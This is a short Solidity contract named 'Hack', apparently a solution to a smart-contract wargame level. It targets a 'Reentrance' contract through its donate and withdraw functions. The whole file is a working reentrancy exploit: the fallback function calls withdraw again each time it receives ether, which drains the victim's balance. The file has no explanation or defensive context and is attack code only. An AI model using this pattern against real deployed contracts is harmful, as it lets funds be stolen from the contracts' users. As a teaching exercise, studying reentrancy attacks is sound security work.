// SPDX-License-Identifier: MIT
pragma solidity ^0.6.5;

interface Reentrance {
     function donate(address _to) external payable ;

function balanceOf(address _who) external view returns (uint balance);
 function withdraw(uint _amount) external;
}

contract Hack {
    
    Reentrance reenter;

constructor(address _instanceAddr) public {
     reenter = Reentrance(_instanceAddr);
}
   

    fallback() external payable {
        reenter.withdraw( 1000000000000000 );
    }

    function deposit() public payable {
        reenter.donate{value: msg.value}(address(this));
    }

    function withdrawEth() public {
        reenter.withdraw(1000000000000000);
    }

}